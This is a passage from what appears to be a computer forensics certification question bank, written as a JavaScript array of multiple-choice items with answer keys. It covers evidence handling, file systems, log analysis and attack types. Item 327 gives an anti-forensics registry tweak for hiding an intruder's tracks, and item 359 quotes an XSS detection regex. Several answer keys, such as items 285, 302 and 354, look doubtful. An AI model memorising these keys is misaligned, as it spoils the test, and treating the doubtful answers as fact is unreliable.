    correctAnswer: 3,
  },
  {
    id: 269,
    question:
      "You are working on a thesis for your doctorate degree in Computer Science. Your thesis is based on HTML, DHTML, and other web-based languages and how they have evolved over the years.\nYou navigate to archive.org and view the HTML code of news.com. You then navigate to the current news.com website and copy over the source code. While searching through the code, you come across something abnormal: What have you found?",
    options: ["Web bug", "CGI code", "Trojan.downloader", "Blind bug"],
    correctAnswer: 0,
  },
  {
    id: 270,
    question:
      "You are using DriveSpy, a forensic tool and want to copy 150 sectors where the starting sector is 1709 on the primary hard drive. Which of the following formats correctly specifies these sectors?",
    options: ["0:1000, 150", "0:1709, 150", "1:1709, 150", "0:1709-1858"],
    correctAnswer: 1,
  },
  {
    id: 271,
    question:
      "A honey pot deployed with the IP 172.16.1.108 was compromised by an attacker. Given below is an excerpt from a Snort binary capture of the attack. Decipher the activity carried out by the attacker by studying the log. Please note that you are required to infer only what is explicit in the excerpt.\n(Note: The student is being tested on concepts learnt during passive OS fingerprinting, basic TCP/IP connection concepts and the ability to read packet signatures from a sniff dump.)\n03/15-20:21:24.107053 211.185.125.124:3500 -> 172.16.1.108:111\nTCP TTL:43 TOS:0x0 ID:29726 IpLen:20 DgmLen:52 DF\n***A**** Seq: 0x9B6338C5 Ack: 0x5820ADD0 Win: 0x7D78 TcpLen: 32\nTCP Options (3) => NOP NOP TS: 23678634 2878772\n03/15-20:21:24.452051 211.185.125.124:789 -> 172.16.1.103:111\nUDP TTL:43 TOS:0x0 ID:29733 IpLen:20 DgmLen:84\nLen: 64 - 01 0A 8A 0A 00 00 00 00 00 00 00 02 00 01 86 A0 . .............\n00 00 00 02 00 00 00 03 00 00 00 00 00 00 00 00 ................\n00 00 00 00 00 00 00 00 00 01 86 B8 00 00 00 01 . ..............\n00 00 00 11 00 00 00 00 ........\n03/15-20:21:24.730436 211.185.125.124:790 -> 172.16.1.103:32773\nUDP TTL:43 TOS:0x0 ID:29781 IpLen:20 DgmLen:1104\nLen: 1084 - 47 F7 9F 63 00 00 00 00 00 00 00 02 00 01 86 B8",
    options: [
      "The attacker has conducted a network sweep on port 111",
      "The attacker has scanned and exploited the system using Buffer Overflow",
      "The attacker has used a Trojan on port 32773",
      "The attacker has installed a backdoor",
    ],
    correctAnswer: 0,
  },
  {
    id: 272,
    question:
      "You are working for a large clothing manufacturer as a computer forensics investigator and are called in to investigate an unusual case of an employee possibly stealing clothing designs from the company and selling them under a different brand name for a different company. What you discover during the course of the investigation is that the clothing designs are actually original products of the employee and the company has no policy against an employee selling his own designs on his own time. The only thing that you can find that the employee is doing wrong is that his clothing design incorporates the same graphic symbol as that of the company with only the wording in the graphic being different. What area of the law is the employee violating?",
    options: [
      "trademark law",
      "copyright law",
      "printright law",
      "brandmark law",
    ],
    correctAnswer: 0,
  },
  {
    id: 273,
    question:
      "What file structure database would you expect to find on floppy disks?",
    options: ["NTFS", "FAT32", "FAT16", "FAT12"],
    correctAnswer: 3,
  },
  {
    id: 274,
    question:
      "What type of attack occurs when an attacker can force a router to stop forwarding packets by flooding the router with many open connections simultaneously so that all the hosts behind the router are effectively disabled?",
    options: [
      "digital attack",
      "denial of service",
      "physical attack",
      "ARP redirect",
    ],
    correctAnswer: 1,
  },
  {
    id: 275,
    question:
      "When examining a file with a Hex Editor, what space does the file header occupy?",
    options: [
      "the last several bytes of the file",
      "the first several bytes of the file",
      "none, file headers are contained in the FAT",
      "one byte at the beginning of the file",
    ],
    correctAnswer: 1,
  },
  {
    id: 276,
    question:
      "In the context of file deletion process, which of the following statement holds true?",
    options: [
      "When files are deleted, the data is overwritten and the cluster marked as available",
      "The longer a disk is in use, the less likely it is that deleted files will be overwritten",
      "While booting, the machine may create temporary files that can delete evidence",
      "Secure delete programs work by completely overwriting the file in one go",
    ],
    correctAnswer: 2,
  },
  {
    id: 277,
    question:
      "A suspect is accused of violating the acceptable use of computing resources, as he has visited adult websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover, he has removed any images he might have downloaded. What can the investigator do to prove the violation?",
    options: [
      "Image the disk and try to recover deleted files",
      "Seek the help of co-workers who are eye-witnesses",
      "Check the Windows registry for connection data (you may or may not recover)",
      "Approach the websites for evidence",
    ],
    correctAnswer: 0,
  },
  {
    id: 278,
    question:
      "A(n) _____________________ is one that's performed by a computer program rather than the attacker manually performing the steps in the attack sequence.",
    options: [
      "blackout attack",
      "automated attack",
      "distributed attack",
      "central processing attack",
    ],
    correctAnswer: 1,
  },
  {
    id: 280,
    question:
      "It takes _____________ mismanaged case/s to ruin your professional reputation as a computer forensics examiner?",
    options: ["by law, three", "quite a few", "only one", "at least two"],
    correctAnswer: 2,
  },
  {
    id: 281,
    question:
      "With the standard Linux second extended file system (Ext2fs), a file is deleted when the inode internal link count reaches ________.",
    options: ["0", "10", "100", "1"],
    correctAnswer: 0,
  },
  {
    id: 282,
    question:
      "When examining the log files from a Windows IIS Web Server, how often is a new log file created?",
    options: [
      "the same log is used at all times",
      "a new log file is created everyday",
      "a new log file is created each week",
      "a new log is created each time the Web Server is started",
    ],
    correctAnswer: 1,
  },
  {
    id: 283,
    question:
      "Which part of the Windows Registry contains the user's password file?",
    options: [
      "HKEY_LOCAL_MACHINE",
      "HKEY_CURRENT_CONFIGURATION",
      "HKEY_USER",
      "HKEY_CURRENT_USER",
    ],
    correctAnswer: 0,
  },
  {
    id: 284,
    question:
      "An employee is attempting to wipe out data stored on a couple of compact discs (CDs) and digital video discs (DVDs) by using a large magnet. You inform him that this method will not be effective in wiping out the data because CDs and DVDs are ______________ media used to store large amounts of data and are not affected by the magnet.",
    options: ["logical", "anti-magnetic", "magnetic", "optical"],
    correctAnswer: 3,
  },
  {
    id: 285,
    question:
      "Lance wants to place a honeypot on his network. Which of the following would be your recommendations?",
    options: [
      "Use a system that has a dynamic addressing on the network",
      "Use a system that is not directly interacting with the router",
      "Use it on a system in an external DMZ in front of the firewall",
      "It doesn't matter as all replies are faked",
    ],
    correctAnswer: 3,
  },
  {
    id: 286,
    question: "What does the acronym POST mean as it relates to a PC?",
    options: [
      "Primary Operations Short Test",
      "PowerOn Self Test",
      "Pre Operational Situation Test",
      "Primary Operating System Test",
    ],
    correctAnswer: 1,
  },
  {
    id: 287,
    question:
      "Which legal document allows law enforcement to search an office, place of business, or other locale for evidence relating to an alleged crime?",
    options: ["bench warrant", "wire tap", "subpoena", "search warrant"],
    correctAnswer: 3,
  },
  {
    id: 288,
    question:
      "You are working as an investigator for a corporation and you have just received instructions from your manager to assist in the collection of 15 hard drives that are part of an ongoing investigation. Your job is to complete the required evidence custody forms to properly document each piece of evidence as it is collected by other members of your team. Your manager instructs you to complete one multi-evidence form for the entire case and a single-evidence form for each hard drive. How will these forms be stored to help preserve the chain of custody of the case?",
    options: [
      "All forms should be placed in an approved secure container because they are now primary evidence in the case.",
      "The multi-evidence form should be placed in the report file and the single-evidence forms should be kept with each hard drive in an approved secure container.",
      "The multi-evidence form should be placed in an approved secure container with the hard drives and the single-evidence forms should be placed in the report file.",
      "All forms should be placed in the report file because they are now primary evidence in the case.",
    ],
    correctAnswer: 1,
  },
  {
    id: 289,
    question: "The MD5 program is used to:",
    options: [
      "wipe magnetic media before recycling it",
      "make directories on an evidence disk",
      "view graphics files on an evidence drive",
      "verify that a disk is not altered when you examine it",
    ],
    correctAnswer: 3,
  },
  {
    id: 300,
    question:
      "Which is a standard procedure to perform during all computer forensics investigations?",
    options: [
      "with the hard drive removed from the suspect PC, check the date and time in the system's CMOS",
      "with the hard drive in the suspect PC, check the date and time in the File Allocation Table",
      "with the hard drive removed from the suspect PC, check the date and time in the system's RAM",
      "with the hard drive in the suspect PC, check the date and time in the system's CMOS",
    ],
    correctAnswer: 0,
  },
  {
    id: 301,
    question:
      "The Recycle Bin exists as a metaphor for throwing files away, but it also allows a user to retrieve and restore files. Once the file is moved to the recycle bin, a record is added to the log file that exists in the Recycle Bin. Which of the following files contains records that correspond to each deleted file in the Recycle Bin?",
    options: ["INFO2", "INFO1", "LOGINFO1", "LOGINFO2"],
    correctAnswer: 0,
  },
  {
    id: 302,
    question:
      "Before accessing digital evidence from victims, witnesses, or suspects, on their electronic devices, what should the investigator do first to respect legal privacy requirements?",
    options: [
      "Protect the device against external communication",
      "Remove the battery or turn-off the device",
      "Obtain a formal written consent to search",
      "Notify the fact to the local authority or employer",
    ],
    correctAnswer: 3,
  },
  {
    id: 303,
    question:
      "“To ensure that the evidence is collected, preserved, examined, or transferred in a manner safeguarding the accuracy and reliability of the evidence, law enforcement, and forensics organizations must establish and maintain an effective quality system” is a principle established by:",
    options: ["SWGDE", "NCIS", "NIST", "EC-Council"],
    correctAnswer: 0,
  },
  {
    id: 304,
    question:
      "Chloe is a forensic examiner who is currently cracking hashed passwords for a crucial mission and hopefully solve the case. She is using a lookup table used for recovering a plain text password from cipher text; it contains word list and brute-force list along with their computed hash values. Chloe is also using a graphical generator that supports SHA1.\n(a) What password technique is being used?\n(b) What tool is Chloe using?",
    options: [
      "a. Cain & Able b. Rten",
      "a. Rainbow Tables b. Winrtgen",
      "a. Dictionary attack b. Cisco PIX",
      "a. Brute-force b. MScache",
    ],
    correctAnswer: 1,
  },
  {
    id: 305,
    question:
      "To which phase of the Computer Forensics Investigation Process does the Planning and Budgeting of a Forensics Lab belong?",
    options: [
      "Post-investigation Phase",
      "Reporting Phase",
      "Pre-investigation Phase",
      "Investigation Phase",
    ],
    correctAnswer: 2,
  },
  {
    id: 306,
    question:
      "Gary is checking for the devices connected to USB ports of a suspect system during an investigation. Select the appropriate tool that will help him document all the connected devices.",
    options: ["DevScan", "Devcon", "fsutil", "Reg.exe"],
    correctAnswer: 1,
  },
  {
    id: 307,
    question:
      "Which standard is used during a judicial trial to assess whether an expert witness’s scientific testimony is based on scientifically valid reasoning that can adequately be applied (admissible) to the facts under consideration?",
    options: [
      "Daubert Standard",
      "Joiner Standard",
      "Dunn Standard",
      "Carmichael Standard",
    ],
    correctAnswer: 0,
  },
  {
    id: 308,
    question:
      "Which of the following attacks allows an attacker to access restricted directories, including application source code, configuration, and critical system files, and then execute commands outside of the web server’s root directory?",
    options: [
      "Unvalidated input",
      "Parameter/Form tampering",
      "Directory traversal",
      "Security misconfiguration",
    ],
    correctAnswer: 2,
  },
  {
    id: 309,
    question:
      "Which of the following is considered as the starting point of a databases and stores user data and database objects in an MS SQL Server?",
    options: [
      "Primary data files (MDF)",
      "ibdata1",
      "Application data files (ADF)",
      "Transaction log data files (LDF)",
    ],
    correctAnswer: 0,
  },
  {
    id: 310,
    question:
      "Which of the following methods of mobile device data acquisition captures all the data present on the device, as well as all deleted data and access to unallocated space?",
    options: [
      "Direct acquisition",
      "Physical acquisition",
      "Logical acquisition",
      "Manual acquisition",
    ],
    correctAnswer: 1,
  },
  {
    id: 311,
    question:
      "During an investigation, Noel found a SIM card from the suspect's mobile. The ICCID on the card is 8944245252001451548.\nWhat does the first four digits (89 and 44) in the ICCID represent?",
    options: [
      "TAC and industry identifier",
      "Industry identifier and country code",
      "Country code and industry identifier",
      "Issuer identifier number and TAC",
    ],
    correctAnswer: 2,
  },
  {
    id: 312,
    question:
      "Which of these Windows utilities helps you to repair logical file system errors?",
    options: [
      "CHKDSK",
      "Disk cleanup",
      "Resource Monitor",
      "Disk defragmenter",
    ],
    correctAnswer: 0,
  },
  {
    id: 313,
    question:
      "When analyzing logs, it is important that the clocks of all the network devices are synchronized. Which protocol will help in synchronizing these clocks?",
    options: ["UTC", "PTP", "Time Protocol", "NTP"],
    correctAnswer: 3,
  },
  {
    id: 314,
    question:
      "During the course of his investigation, Vincent came across a situation where he needs to run a packet sniffing tool on a Linux-based machine to monitor the network traffic. Which tool should Vincent choose in this case?",
    options: ["Tcpdump", "Balbuzard", "CurrPorts", "DumpIt"],
    correctAnswer: 0,
  },
  {
    id: 315,
    question: "Rule 1002 of Federal Rules of Evidence (US) talks about _____",
    options: [
      "Admissibility of duplicates",
      "Admissibility of original",
      "Requirement of original",
      "Admissibility of other evidence of contents",
    ],
    correctAnswer: 2,
  },
  {
    id: 316,
    question:
      "Which of the following applications will allow a forensic investigator to track the user login sessions and user transactions that have occurred on an MS SQL Server?",
    options: ["netcat", "Event Log Explorer", "ApexSQL Audit", "Notepad++"],
    correctAnswer: 2,
  },
  {
    id: 317,
    question:
      "You are an information security analyst for a national retail chain. The organization has a web server which provides customer reports to internal users for marketing purposes. You are analyzing IIS logs on the web server and find the following log entry:\n\n#Software: Microsoft Internet Information Services 7.5\n#Version 1.0\n#Date 2020-04-28 11:50:54\n#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken\n\n2020-04-28 11:50:54 192.168.1.39 GET /Data/Files/customer_report.xlsx 80 – 192.168.1.200 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.51.22 (KHTML, like Gecko) Version/5.1.1 Safari/534.51.22 200 0 0 54\n\nBased on the contents of this log entry, what occurred?",
    options: [
      "A User at IP address 192.168.1.39 requested the customer_report.xlsx file and the web server at IP address 192.168.1.200 processed the request",
      "A User at IP address 192.168.1.39 requested the customer_report.xlsx file and the web server at IP address 192.168.1.200 failed to process the request",
      "A User at IP address 192.168.1.200 requested the customer_report.xlsx file and the web server at IP address 192.168.1.39 failed to process the request",
      "A User at IP address 192.168.1.200 requested the customer_report.xlsx file and the web server at IP address 192.168.1.39 processed the request",
    ],
    correctAnswer: 3,
  },
  {
    id: 318,
    question:
      "Donald made an OS disk snapshot of a compromised Azure VM under a resource group being used by the affected company as a part of forensic analysis process. He then created a vhd file out of the snapshot and stored it in a file share and as a page blob as backup in a storage account under different region. What is the next thing he should do as a security measure?",
    options: [
      "Delete the OS disk of the affected VM altogether",
      "Delete the snapshot from the source resource group",
      "Recommend changing the access policies followed by the company",
      "Create another VM by using the snapshot",
    ],
    correctAnswer: 1,
  },
  {
    id: 319,
    question:
      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer Lab. When you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a 'simple backup copy' of the hard drive in the PC and put it on this drive and requests that you examine the drive for evidence of the suspected images. You inform him that a 'simple backup copy' will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
    options: [
      "Robust copy",
      "Incremental backup copy",
      "Bit-stream copy",
      "Full backup copy",
    ],
    correctAnswer: 2,
  },
  {
    id: 320,
    question:
      "Sally accessed the computer system that holds trade secrets of the company where she is employed. She knows she accessed it without authorization and all access (authorized and unauthorized) to this computer is monitored. To cover her tracks, Sally deleted the log entries on this computer. What among the following best describes her action?",
    options: [
      "Password sniffing",
      "Brute-force attack",
      "Anti-forensics",
      "Network intrusion",
    ],
    correctAnswer: 2,
  },
  {
    id: 321,
    question:
      "Which OWASP IoT vulnerability talks about security flaws such as lack of firmware validation, lack of secure delivery, and lack of anti-rollback mechanisms on IoT devices?",
    options: [
      "Insecure default settings",
      "Use of insecure or outdated components",
      "Lack of secure update mechanism",
      "Insecure data transfer and storage",
    ],
    correctAnswer: 2,
  },
  {
    id: 322,
    question:
      "Which of the following directories contains the binary files or executables required for system maintenance and administrative tasks on a Linux system?",
    options: ["/lib", "/bin", "/usr", "/sbin"],
    correctAnswer: 3,
  },
  {
    id: 323,
    question:
      "According to RFC 3227, which of the following is considered as the most volatile item on a typical system?",
    options: [
      "Temporary system files",
      "Archival media",
      "Registers and cache",
      "Kernel statistics and memory",
    ],
    correctAnswer: 2,
  },
  {
    id: 324,
    question:
      'An investigator enters the command sqlcmd -S WIN-CQQMK62867E -e -s"." -E as part of collecting the primary data file and logs from a database. What does the “WIN-CQQMK62867E” represent?',
    options: [
      "Name of the Database",
      "Name of SQL Server",
      "Operating system of the system",
      "Network credentials of the database",
    ],
    correctAnswer: 1,
  },
  {
    id: 325,
    question:
      "You are a forensic investigator who is analyzing a hard drive that was recently collected as evidence. You have been unsuccessful at locating any meaningful evidence within the file system and suspect a drive wiping utility may have been used. You have reviewed the keys within the software hive of the Windows registry and did not find any drive wiping utilities. How can you verify that drive wiping software was used on the hard drive?",
    options: [
      "Check the list of installed programs",
      "Load various drive wiping utilities offline, and export previous run reports",
      "Document in your report that you suspect a drive wiping utility was used, but no evidence was found",
      "Look for distinct repeating patterns on the hard drive at the bit level",
    ],
    correctAnswer: 3,
  },
  {
    id: 326,
    question:
      "Jeff is a forensics investigator for a government agency's cybersecurity office. Jeff is tasked with acquiring a memory dump of a Windows 10 computer that was involved in a DDoS attack on the government agency's web application. Jeff is onsite to collect the memory. What tool could Jeff use?",
    options: ["Memcheck", "Autopsy", "Volatility", "RAMMapper"],
    correctAnswer: 2,
  },
  {
    id: 327,
    question:
      "An attacker successfully gained access to a remote Windows system and plans to install persistent backdoors on it. Before that, to avoid getting detected in future, he wants to cover his tracks by disabling the last-accessed timestamps of the machine. What would he do to achieve this?",
    options: [
      "Set the registry value of HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\NtfsDisableLastAccessUpdate to 0",
      "Set the registry value of HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\NtfsDisableLastAccessUpdate to 1",
      "Run the command fsutil behavior set disablelastaccess 0",
      "Run the command fsutil behavior set enablelastaccess 0",
    ],
    correctAnswer: 1,
  },
  {
    id: 328,
    question:
      "A forensic examiner encounters a computer with a failed OS installation and the master boot record (MBR) or partition sector damaged. Which of the following tools can find and restore files and information in the disk?",
    options: ["Helix", "R-Studio", "Wireshark", "NetCat"],
    correctAnswer: 1,
  },
  {
    id: 329,
    question:
      "Choose the layer in iOS architecture that provides frameworks for iOS app development?",
    options: ["Core services", "Media services", "Core OS", "Cocoa Touch"],
    correctAnswer: 3,
  },
  {
    id: 330,
    question: "ISO/IEC 17025 is an accreditation for which of the following?",
    options: [
      "Encryption",
      "Chain of custody",
      "CHFI issuing agency",
      "Forensics lab licensing",
    ],
    correctAnswer: 3,
  },
  {
    id: 331,
    question:
      "Recently, an internal web app that a government agency utilizes has become unresponsive. Betty, a network engineer for the government agency, has been tasked to determine the cause of the web application's unresponsiveness. Betty launches Wireshark and begins capturing the traffic on the local network. While analyzing the results, Betty noticed that a SYN flood attack was underway. How did Betty know a SYN flood attack was occurring?",
    options: [
      "Wireshark capture shows multiple SYN requests and RST responses from single/multiple IP address(es)",
      "Wireshark capture does not show anything unusual and the issue is related to the web application",
      "Wireshark capture shows multiple ACK requests and SYN responses from single/multiple IP address(es)",
      "Wireshark capture shows multiple SYN requests and ACK responses from single/multiple IP address(es)",
    ],
    correctAnswer: 3,
  },
  {
    id: 332,
    question:
      "You have been asked to investigate the possibility of computer fraud in the finance department of a company. It is suspected that a staff member has been committing finance fraud by printing cheques that have not been authorized. You have exhaustively searched all data files on a bitmap image of the target computer, but have found no evidence. You suspect the files may not have been saved. What should you examine next in this case?",
    options: [
      "The registry",
      "The swap file",
      "The recycle bin",
      "The metadata",
    ],
    correctAnswer: 1,
  },
  {
    id: 333,
    question:
      "Examination of a computer by a technically unauthorized person will almost always result in:",
    options: [
      "Rendering any evidence found inadmissible in a court of law",
      "Completely accurate results of the examination",
      "The chain of custody being fully maintained",
      "Rendering any evidence found admissible in a court of law",
    ],
    correctAnswer: 0,
  },
  {
    id: 334,
    question:
      "“No action taken by law enforcement agencies or their agents should change data held on a computer or storage media which may subsequently be relied upon in court” — this principle is advocated by which of the following?",
    options: [
      "The Association of Chief Police Officers (ACPO) Principles of Digital Evidence",
      "FBI Cyber Division",
      "Scientific Working Group on Imaging Technology (SWGIT)",
      "Locard’s exchange principle",
    ],
    correctAnswer: 0,
  },
  {
    id: 335,
    question:
      "Which of the following statements is true regarding SMTP Server?",
    options: [
      "SMTP Server breaks the recipient's address into Recipient's name and his/her designation before passing it to the DNS Server",
      "SMTP Server breaks the recipient's address into Recipient's name and recipient's address before passing it to the DNS Server",
      "SMTP Server breaks the recipient's address into Recipient's name and his/her initial before passing it to the DNS Server",
      "SMTP Server breaks the recipient's address into Recipient's name and domain name before passing it to the DNS Server",
    ],
    correctAnswer: 3,
  },
  {
    id: 336,
    question:
      "You are asked to build a forensic lab and your manager has specifically informed you to use copper for lining the walls, ceilings, and floor. What is the main purpose of lining the walls, ceilings, and floor with copper?",
    options: [
      "To make the lab sound proof",
      "To control the room temperature",
      "To strengthen the walls, ceilings, and floor",
      "To avoid electromagnetic emanations",
    ],
    correctAnswer: 3,
  },
  {
    id: 337,
    question:
      "Debbie has obtained a warrant to search a known pedophile's house. Debbie went to the house and executed the search warrant to seize digital devices that have been recorded as being used for downloading illicit images. She seized all digital devices except a digital camera. Why did she not collect the digital camera?",
    options: [
      "Debbie overlooked the digital camera because it is not a computer system",
      "The digital camera was not listed as one of the digital devices in the warrant",
      "The vehicle Debbie was using to transport the evidence was already full and could not carry more items",
      "The digital camera was old, had a cracked screen, and did not have batteries. Therefore, it could not have been used in a crime.",
    ],
    correctAnswer: 1,
  },
  {
    id: 338,
    question:
      "To understand the impact of a malicious program after the booting process and to collect recent information from the disk partition, an investigator should evaluate the content of the:",
    options: ["UEFI", "BIOS", "MBR", "GRUB"],
    correctAnswer: 2,
  },
  {
    id: 339,
    question:
      "Which of the following statements is TRUE about SQL Server error logs?",
    options: [
      "Forensic investigator uses SQL Server Profiler to view error log files",
      "Trace files record, user-defined events, and specific system events",
      "Error logs contain IP address of SQL Server client connections",
      "SQL Server error logs record all the events occurred on the SQL Server and its databases",
    ],
    correctAnswer: 2,
  },
  {
    id: 340,
    question:
      "Assume there is a file named myfile.txt in C: drive that contains hidden data streams. Which of the following commands would you issue to display the contents of a data stream?",
    options: [
      "C:\\MORE < myfile.txt:stream1",
      "C:\\>ECHO text_message > myfile.txt:stream1",
      "echo text > program:source_file",
      "myfile.dat:stream1",
    ],
    correctAnswer: 0,
  },
  {
    id: 341,
    question:
      "A computer forensics investigator or forensic analyst is a specially trained professional who works with law enforcement as well as private businesses to retrieve information from computers and other types of data storage devices. For this, the analyst should have an excellent working knowledge of all aspects of the computer. Which of the following is not a duty of the analyst during a criminal investigation?",
    options: [
      "To fill the chain of custody",
      "To recover data from suspect devices",
      "To enforce the security of all devices and software in the scene",
      "To create an investigation report",
    ],
    correctAnswer: 2,
  },
  {
    id: 342,
    question:
      "Which command can provide the investigators with details of all the loaded modules on a Linux-based system?",
    options: ["list modules -a", "lsmod", "plist mod -a", "lsof -m"],
    correctAnswer: 1,
  },
  {
    id: 343,
    question:
      "Jack is reviewing file headers to verify the file format and hopefully find more information of the file. After a careful review of the data chunks through a hex editor; Jack finds the binary value 0xFFD8. Based on the above information, what type of format is the file/image saved as?",
    options: ["BMP", "GIF", "ASCII", "JPEG"],
    correctAnswer: 3,
  },
  {
    id: 344,
    question:
      "In which IoT attack does the attacker use multiple forged identities to create a strong illusion of traffic congestion, affecting communication between neighboring nodes and networks?",
    options: [
      "Blueborne attack",
      "Jamming attack",
      "Sybil attack",
      "Replay attack",
    ],
    correctAnswer: 2,
  },
  {
    id: 345,
    question:
      "Amber, a black hat hacker, has embedded a malware into a small enticing advertisement and posted it on a popular ad-network that displays across various websites. What is she doing?",
    options: [
      "Click-jacking",
      "Compromising a legitimate site",
      "Spearphishing",
      "Malvertising",
    ],
    correctAnswer: 3,
  },
  {
    id: 346,
    question:
      "Malware analysis can be conducted in various manners. An investigator gathers a suspicious executable file and uploads it to VirusTotal in order to confirm whether the file is malicious, provide information about its functionality, and provide information that will allow to produce simple network signatures. What type of malware analysis was performed here?",
    options: ["Dynamic", "Static", "Volatile", "Hybrid"],
    correctAnswer: 1,
  },
  {
    id: 347,
    question:
      "Netstat is a tool for collecting Information regarding network connections. It provides a simple view of TCP and UDP connections, and their state and network traffic statistics. Which of the following commands shows you the TCP and UDP network connections, listening ports, and the identifiers?",
    options: ["netstat -s", "netstat -r", "netstat -b", "netstat -ano"],
    correctAnswer: 3,
  },
  {
    id: 348,
    question:
      "Cybercriminals sometimes use compromised computers to commit other crimes, which may involve using computers or networks to spread malware or illegal information. Which type of cybercrime stops users from using a device or network, or prevents a company from providing a software service to its customers?",
    options: [
      "Denial-of-Service (DoS) attack",
      "Ransomware attack",
      "Malware attack",
      "Phishing",
    ],
    correctAnswer: 0,
  },
  {
    id: 349,
    question:
      "This law sets the rules for commercial email, establishes requirements for commercial messages, gives recipients the right to have you stop emailing them, and spells out tough penalties for violations.",
    options: [
      "The CAN-SPAM act",
      "Telemarketing act",
      "Federal Spam act",
      "European Anti-Span act",
    ],
    correctAnswer: 0,
  },
  {
    id: 350,
    question:
      "Consider a scenario where the perpetrator of a dark web crime has uninstalled Tor browser from their computer after committing the crime. The computer has been seized by law enforcement so they can investigate it for artifacts of Tor browser usage. Which of the following should the investigators examine to establish the use of Tor browser on the suspect machine?",
    options: [
      "Prefetch files",
      "Swap files",
      "Files in Recycle Bin",
      "Security logs",
    ],
    correctAnswer: 0,
  },
  {
    id: 351,
    question:
      "Which of the following malware targets Android mobile devices and installs a backdoor that remotely installs applications from an attacker-controlled server?",
    options: ["Felix", "XcodeGhost", "xHelper", "Unflod"],
    correctAnswer: 2,
  },
  {
    id: 352,
    question:
      "Which layer in the IoT architecture is comprised of hardware parts such as sensors, RFID tags, and devices that play an important role in data collection?",
    options: [
      "Access gateway layer",
      "Middleware layer",
      "Edge technology layer",
      "Application layer",
    ],
    correctAnswer: 2,
  },
  {
    id: 353,
    question:
      "At a trading organization, three employees receive email from a senior official at ABC bank asking them to urgently fill customer-specific details at the bank’s website. As the organization already has a partnership with bank, all the employees visited the website and updated customer-related information, such as their bank account details, confidential documents, and credit card information. After a day, all the concerned customers complained that large amounts of money has been spent using their credit cards and they cannot log into their bank accounts. What kind of attack is this?",
    options: ["Spear phishing", "Mail bombing", "Whaling", "Email spamming"],
    correctAnswer: 0,
  },
  {
    id: 354,
    question:
      "Steve thought it would be funny to make some changes on Tom's computer at their office. Steve went into the Microsoft Windows registry and changed the keyboard mapping configuration on Tom’s computer. Now Tom is unable to log into his computer because of the changes. Could Steve’s actions warrant a cybercrime investigation?",
    options: [
      "Yes, because Steve performed a denial-of-service attack on Tom’s computer",
      "Yes, because modifying computer software is always treated as a federal offense",
      "No, because there is no company policy that prohibits computer pranks on co-workers",
      "No, because this scenario describes a corporate investigation",
    ],
    correctAnswer: 1,
  },
  {
    id: 355,
    question:
      "Data is striped at a byte level across multiple drives and parity information is distributed among all member drives. What RAID level is represented here?",
    options: ["RAID Level 5", "RAID Level 1", "RAID Level 0", "RAID Level 3"],
    correctAnswer: 0,
  },
  {
    id: 356,
    question:
      "Brian has the job of analyzing malware for a software security company. Brian has setup a virtual environment that includes virtual machines running various versions of OSes. Additionally, Brian has setup separated virtual networks within this environment. The virtual environment does not connect to the company's intranet nor does it connect to the external Internet. With everything setup, Brian now received an executable file from client that has undergone a cyberattack. Brian ran the executable file in the virtual environment to see what it would do. What type of analysis did Brian perform?",
    options: [
      "Static OS analysis",
      "Dynamic malware analysis",
      "Status malware analysis",
      "Static malware analysis",
    ],
    correctAnswer: 1,
  },
  {
    id: 357,
    question:
      "Frank, a cloud administrator in his company, needs to take backup of the OS disks of two Azure VMs that store business-critical data. Which type of Azure blob storage can he use for this purpose?",
    options: ["Append blob", "Medium blob", "Block blob", "Page blob"],
    correctAnswer: 3,
  },
  {
    id: 358,
    question:
      "During a forensic investigation, a large number of files were collected. The investigator needs to evaluate ownership and accountability of those files. Therefore, he begins to identify attributes such as “author name”, “organization name”, “network name”, or any additional supporting data that is meant for the owner’s identification purpose. Which term describes these attributes?",
    options: ["Data index", "Metabase", "Data header", "Metadata"],
    correctAnswer: 3,
  },
  {
    id: 359,
    question:
      "Simona has written a regular expression for the detection of web application-specific attack attempt that reads as /((\\%3C)|<)((\\%2F)| V)*[a-z0-9\\%]+((\\%3E)|>)/ix. Which of the following does the part ((\\%3E)|>) look for?",
    options: [
      "Alphanumeric string or its hex equivalent",
      "Forward slash for a closing tag or its hex equivalent",
      "Opening angle bracket or its hex equivalent",
      "Closing angle bracket or its hex equivalent",
    ],
    correctAnswer: 3,
  },
  {
    id: 360,
    question:
      "An investigator is checking a Cisco firewall log that reads as follows:\nAug 21 2019 09:16:44: %ASA-1 -106021: Deny ICMP reverse path check from 10.0.0.44 to 10.0.0.33 on interface outside\nWhat does %ASA-1-106021 denote?",
    options: [
      "Mnemonic message",
      "Firewall action",
      "Type of request",
      "Type of traffic",
    ],
    correctAnswer: 0,
  },
  {
    id: 361,
    question:
      "A cybercriminal is attempting to remove evidence from a Windows computer. He deletes the file evidence1.doc, sending it to Windows Recycle Bin. The cybercriminal then empties the Recycle Bin. After having been removed from the Recycle Bin, what will happen to the data?",
    options: [
      "The data will be moved to new clusters in unallocated space",
      "The data will be overwritten with zeroes",
      "The data will become corrupted, making it unrecoverable",
      "The data will remain in its original clusters until it is overwritten",
    ],
    correctAnswer: 3,
  },
  {
    id: 362,
    question:
      "Which of the following is a requirement for senders as per the CAN-SPAM act?",
    options: [
      "Senders should never share their physical postal address in the email",
      "Senders cannot use misleading or false header information",
      "Senders must use deceptive subject lines",
      "Emails must not contain information regarding how to stop receiving emails from the sender in future",
    ],
    correctAnswer: 1,
  },
  {
    id: 363,
    question:
      "An investigator seized a notebook device installed with a Microsoft Windows OS. Which type of files would support an investigation of the data size and structure in the device?",
    options: ["APFS and HFS", "NTFS and FAT", "Ext2 and Ext4", "HFS and GNUC"],
    correctAnswer: 1,
  },
  {
    id: 364,
    question:
